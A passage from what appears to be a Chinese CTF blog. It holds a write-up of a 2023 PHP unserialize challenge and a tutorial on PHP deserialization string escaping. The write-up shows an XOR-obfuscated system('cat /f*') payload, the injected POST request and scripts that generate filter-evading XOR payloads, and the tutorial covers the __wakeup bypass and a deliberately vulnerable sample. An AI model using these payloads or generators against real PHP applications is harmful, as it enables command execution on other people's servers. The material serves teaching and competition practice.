class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">7</span>E%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">7</span>E%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%D5%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>



<p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/AAwangzhan\1\hexoblog\source\image\image-20230810191408215.png"></p>
<p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/AAwangzhan\1\hexoblog\source\image\image-20230810191445372.png"></p>
<p>大佬的做法：</p>
<p>利用脚本构造异或的playload：（文章末尾附脚本）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%00&quot;^&quot;%60%60%7c%20%2f%60%2a&quot;);</span><br><span class="line"></span><br><span class="line">base64一下</span><br><span class="line">KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7</span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/AAwangzhan\1\hexoblog\source\image\image-20230810175712493.png">生成反序列化字符串</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>然后逃逸字符，逃逸14个字符，可以在pwd参数位置在本地微调</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: web-898394c697.challenge.xctf.org.cn</span><br><span class="line">Content-Length: 313</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=52q1rf64lljie7ivi6tbte4hnb</span><br><span class="line"></span><br><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=&quot;;s:5:&quot;datou&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span><br></pre></td></tr></table></div></figure>

<p>再访问login.php拿flag，记得带上SESSION</p>
<p>脚本：先php生成文本，再py</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>xor.py</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">Php反序列化字符串逃逸</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-03</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="PHP-反序列化字符串逃逸">
          <a href="#PHP-反序列化字符串逃逸" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP-反序列化字符串逃逸" class="headerlink" title="PHP 反序列化字符串逃逸"></a>PHP 反序列化字符串逃逸</h1>
      
        <h3 id="反序列化是什么？">
          <a href="#反序列化是什么？" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化是什么？" class="headerlink" title="反序列化是什么？"></a>反序列化是什么？</h3>
      <p>PHP序列化：serialize()</p>
<p>序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
<p>而PHP反序列化：unserialize()</p>
<p>反序列化是将字符串转换成变量或对象的过程</p>
<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。这样说可能还不是很具体，举个列子比如你网购买一个架子，发货为节省成本，是拆开给你发过去，到你手上，然后给你说明书让你组装，拆开给你这个过程可以说是序列化，你组装的过程就是反序列化</p>
<p>谈到php反序列化，我们先来看一下PHP他的面向对象怎么个理解，</p>
<p>面向过程vs面向对象</p>
<p><strong>面向过程</strong><br>面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。<br><strong>面向对象</strong><br>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”;<br>对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。<br>对象的三个特征:<strong>对象的行为，对象的形态，对象的表示</strong></p>
<p>类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起。<br>对象是具有类类型的变量，是对类的实例。</p>
<p>内部构成：成员变量（属性）+成员函数（方法）</p>

        <h3 id="php序列化的字母标识">
          <a href="#php序列化的字母标识" class="heading-link"><i class="fas fa-link"></i></a><a href="#php序列化的字母标识" class="headerlink" title="php序列化的字母标识"></a>php序列化的字母标识</h3>
      <p>a - array</p>
<p>b - boolean</p>
<p>d - double</p>
<p>i - integer</p>
<p>o - common object</p>
<p>r - reference</p>
<p>s - string</p>
<p>C - custom object</p>
<p>O - class</p>
<p>N - null</p>
<p>R - pointer reference</p>
<p>U - unicode string</p>
<p>N - NULL</p>

        <h3 id="魔术方法">
          <a href="#魔术方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3>
      <p>__construct 当一个对象创建时被调用，new 一个</p>
<p>__destruct 当一个对象销毁时被调用，序列化一个</p>
<p>__toString 当一个对象被当作一个字符串被调用。</p>
<p>__wakeup() 使用unserialize时触发</p>
<p>__sleep() 使用serialize时触发</p>
<p>__destruct() 对象被销毁时触发</p>
<p>__call() 对不存在的方法或者不可访问的方法进行调用就自动调用</p>
<p>__callStatic() 在静态上下文中调用不可访问的方法时触发</p>
<p>__get() 用于从不可访问的属性读取数据</p>
<p>__set() 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p>
<p>__isset() 在不可访问的属性上调用isset()或empty()触发</p>
<p>__unset() 在不可访问的属性上使用unset()时触发</p>
<p>__toString() 把类当作字符串使用时触发,返回值需要为字符串</p>
<p>__invoke() 当脚本尝试将对象调用为函数时触发</p>
<p>注意点：private protected 属性 序列化出来会有不可打印字符，需要url编码一下</p>

        <h3 id="wakeup绕过">
          <a href="#wakeup绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h3>
      <p>这个其实是个CVE,CVE-2016-7124</p>
<p>影响版本php5&lt;5.6.25,php7&lt;7.010</p>
<p>简单描述就是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
<p>而魔术方法__wakeup执行unserialize()时，<strong>先</strong>会调用这个函数</p>
<p>我们本地实验一下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;触发__construct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;触发__wakeup&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230801115227872.png"></p>
<p>先序列化一下，触发了___construct，将序列化的内容我们在反序列化看一看</p>
<p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230801115556904.png"></p>
<blockquote>
<p>这样则触发了__wake,我们将O:1:”A”:2:{s:1:”a”;s:17:”触发__construct”;} 把对象个数改为2</p>
</blockquote>
<p>触发了__construct,绕过了wakeup</p>

        <h3 id="反序列化逃逸问题">
          <a href="#反序列化逃逸问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化逃逸问题" class="headerlink" title="反序列化逃逸问题"></a>反序列化逃逸问题</h3>
      <p>逃逸问题的本质是改变序列化字符串的长度，导致反序列化漏洞</p>
<p>所以会有两种情况，一种是由长变短,一种是由短变长；}</p>

        <h3 id="由长变短">
          <a href="#由长变短" class="heading-link"><i class="fas fa-link"></i></a><a href="#由长变短" class="headerlink" title="由长变短"></a>由长变短</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//$data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abcsystem()system()system()&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line">    <span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:27:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<blockquote>
<p>O:1:”A”:2:{s:2:”v1”;s:27:”abc”;s:2:”v2”;s:3:”123”;}</p>
<p>O:1:”A”:2:{s:2:”v1”;s:27:”**abc”;s:2:”v2”;s:3:”**s:2:”v3”;s:3:”123”;}”;}</p>
<p>O:1:”A”:2:{s:2:”v1”;s:27:”abc<del>system()system()system()</del>“;s:2:”v2”;s:？？:”1234567”;s:2:”v3”;N;}”;}</p>
<p>{s:2:”v1”;s:27:”<strong>abc”;s:2:”v2”;s:21:”1234567</strong>“;s:2:”v3”;N;}”;}</p>
</blockquote>

        <h3 id="由短变长">
          <a href="#由短变长" class="heading-link"><i class="fas fa-link"></i></a><a href="#由短变长" class="headerlink" title="由短变长"></a>由短变长</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;pwd&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;ls&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:2:&quot;pwd&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span></span><br></pre></td></tr></table></div></figure>

<blockquote>
<p>O:1:”A”:2:{s:2:”v1”;s:2:”ls”;s:2:”v2”;s:3:”123”;}</p>
<p>&#x2F;O:1:”A”:2:{s:2:”v1”;s:2:”pwd”;s:2:”v2”;s:3:”123”;}</p>
<p>字符串增多，会把末尾的字符串挤出来，</p>
<p>就可以利用挤出来的字符串来构造我们利用的功能性代码</p>
<p>O:1:”A”:2:{s:2:”v1”;s:2:”pw<strong>d”;s:2:”v3”;s:3:”www”;}</strong>;”s:2:”v2”;s:3:”123”;}</p>
<p>要吐出这些字符d”;s:2:”v3”;s:3:”www”;},使结构完整，并且可以吧序列化结束掉，原本的那些就不管了</p>
<p>增加了22位一个ls，转换为pwd,增加一个字符，需要转换22个字符</p>
<p>O:1:”A”:2:{s:2:”v1”;s:66:”lslslslslslslslslslslslslslslslslslslslslsls”;s:2:”v3”;s:3:”www”;}；”s:2:”v2”;s:3:”123”;}</p>
</blockquote>
<p><img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230804134635993.png"></p>
<p>例题：字符串增多</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="variable">$name</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&#x27;daydream&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$param</span>));</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$param</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pass==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>





